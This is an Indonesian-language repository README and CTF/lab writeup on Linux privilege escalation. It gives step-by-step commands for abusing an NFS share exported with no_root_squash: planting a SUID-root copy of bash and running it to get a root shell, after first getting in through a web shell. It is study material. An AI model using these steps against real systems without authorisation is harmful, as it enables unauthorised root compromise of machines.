# Privilege Escalation Vuln

Dokumentasi teknik privilege escalation pada sistem Linux, disusun sebagai catatan pribadi dari eksplorasi CTF/lab. Setiap folder membahas satu vektor privesc secara spesifik, lengkap dengan konsep dasar, tahapan eksploitasi, dan kendala yang ditemui selama praktik.

## Daftar Teknik

| Folder | Vektor | Ringkasan |
|---|---|---|
| [`nfs-misconfigured`](./nfs-misconfigured) | NFS `no_root_squash` | Eksploitasi NFS share yang di-export dengan `no_root_squash`, memungkinkan attacker membuat binary SUID root dari mesin sendiri lalu mengeksekusinya di target untuk mendapat root shell |
| [`nmap-sudo`](./nmap-sudo) | Sudo misconfiguration (`nmap`) | Eksploitasi konfigurasi sudo yang mengizinkan user menjalankan `nmap` sebagai root, memanfaatkan fitur interactive mode bawaan Nmap untuk mendapat shell root |

## Struktur Repo

```
.
├── nfs-misconfigured/
│   └── README.md      # Writeup lengkap teknik NFS no_root_squash
├── nmap-sudo/
│   └── README.md      # Writeup lengkap teknik sudo nmap privesc
└── README.md           # File ini
```

## Catatan

- Dokumentasi ini dibuat untuk keperluan belajar (CTF/lab pribadi), bukan untuk digunakan pada sistem yang tidak dimiliki atau tanpa izin.
- Setiap teknik disertai bagian kendala & solusi berdasarkan pengalaman praktik langsung, termasuk kesalahan umum yang sering terjadi (misal salah permission bit, mismatch versi glibc, dsb).

## Referensi Umum

- [GTFOBins](https://gtfobins.github.io/) — daftar binary Unix dan cara penyalahgunaannya jika punya SUID/sudo access
- [HackTricks](https://book.hacktricks.xyz/) — referensi umum teknik privilege escalation Linux# NFS `no_root_squash` Privilege Escalation — Writeup

Dokumentasi privilege escalation dari low-privilege user ke root dengan memanfaatkan NFS share yang di-export dengan opsi `no_root_squash`.

## Ringkasan

| | |
|---|---|
| **Vektor privesc** | NFS `no_root_squash` |
| **Direktori target** | `/var/www/html` |
| **Initial access** | Web shell (`shell.php`) |
| **Hasil akhir** | Root shell (`uid=0`) |

## Daftar Isi

- [Konsep Dasar](#konsep-dasar)
- [Tahapan Eksploitasi](#tahapan-eksploitasi)
- [Kendala & Solusi](#kendala--solusi)
- [Referensi](#referensi)

## Konsep Dasar

### NFS (Network File System)
Protokol yang memungkinkan client me-mount direktori dari server lain lewat jaringan. Direktori yang dibagikan (di-*export*) dan opsi aksesnya dikonfigurasi di `/etc/exports` pada sisi server.

### `no_root_squash`
Secara default, NFS men-*squash* (menurunkan) UID root dari client menjadi `nobody` saat mengakses share — proteksi supaya root di client tidak otomatis jadi root di server. Kalau opsi `no_root_squash` diaktifkan pada suatu direktori, proteksi ini dimatikan: UID root dari client tetap dianggap root oleh server.

### RCE (Remote Code Execution)
Kemampuan menjalankan perintah arbitrary di mesin target dari jarak jauh, biasanya lewat celah aplikasi. Di writeup ini, RCE didapat lewat `shell.php` yang di-upload/diakses di web server vulnerable, menghasilkan shell dengan privilege service account (`www-data`/`low`), bukan root.

## Tahapan Eksploitasi

### 1. Initial Access
Dapatkan RCE low-privilege di target, misalnya lewat web shell (`shell.php`) pada aplikasi web yang vulnerable.

### 2. Enumerasi NFS Export
Dari sisi attacker, cek share yang di-export target:
```bash
showmount -e <target-ip>
```
Konfirmasi direktori mana yang punya opsi `no_root_squash` (biasanya terlihat dari `/etc/exports` kalau bisa dibaca, atau dari hasil testing langsung).

### 3. Mount Share dari Attacker
```bash
mount -t nfs <target-ip>:/var/www/html /mnt/target-share
```
Karena `no_root_squash` aktif, operasi file yang dilakukan sebagai root di attacker akan terefleksi sebagai root juga di sisi server target.

### 4. Buat Binary SUID Root
Cara paling simpel: salin binary yang sudah ada di sistem (bukan script, karena SUID diabaikan kernel untuk file berbasis shebang).

```bash
cp /usr/bin/bash /mnt/target-share/shell
chown root:root /mnt/target-share/shell
chmod 4755 /mnt/target-share/shell
```

Verifikasi SUID bit benar-benar aktif:
```bash
ls -l /mnt/target-share/shell
# -rwsr-xr-x  → benar (huruf 's')
# -rwxr-xr-x  → salah, SUID tidak ke-set
```

### 5. Eksekusi di Sisi Target
Kembali ke shell low-privilege di target:
```bash
cd /var/www/html
./shell -p
```
Flag `-p` (privileged mode) diperlukan supaya bash **tidak** drop privilege-nya secara otomatis (proteksi bawaan bash saat mendeteksi real UID ≠ effective UID).

### 6. Verifikasi
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Kendala & Solusi

| Masalah | Penyebab | Solusi |
|---|---|---|
| `GLIBC_2.34 not found` saat eksekusi binary C custom | Binary di-compile di attacker dengan versi glibc lebih baru dari target | Compile static: `gcc -static -o shell shell.c` |
| Shell tetap `uid` low meski sudah `chmod` | Lupa digit ke-4 pada `chmod` (misal `755` bukan `4755`) sehingga SUID bit tidak ke-set | Pastikan pakai `4755`, cek dengan `ls -l` (harus muncul huruf `s`) |
| SUID tidak berfungsi pada script (Python/PHP) | Kernel Linux modern mengabaikan SUID bit pada file berbasis shebang sebagai proteksi keamanan | Gunakan compiled binary (ELF) seperti `bash` atau C binary |

### Permission Bits (Digit ke-4)

Selain 3 digit permission standar (`rwx` owner/group/other), ada digit spesial di depannya:

| Digit | Nama | Simbol `ls -l` | Fungsi |
|---|---|---|---|
| `4` | SUID | `s` di owner-execute | Jalan dengan privilege **owner file** |
| `2` | SGID | `s` di group-execute | Jalan dengan privilege **group file** / file baru mewarisi group direktori |
| `1` | Sticky Bit | `t` di other-execute | Hanya owner file yang bisa hapus/rename di direktori shared |

Contoh: `4755` → `-rwsr-xr-x`, `6755` → `-rwsr-sr-x` (SUID + SGID sekaligus).

## Referensi

- [GTFOBins](https://gtfobins.github.io/) — daftar binary Unix dan cara penyalahgunaannya jika punya SUID/sudo access
- `man 5 exports` — dokumentasi opsi NFS exports termasuk `no_root_squash`
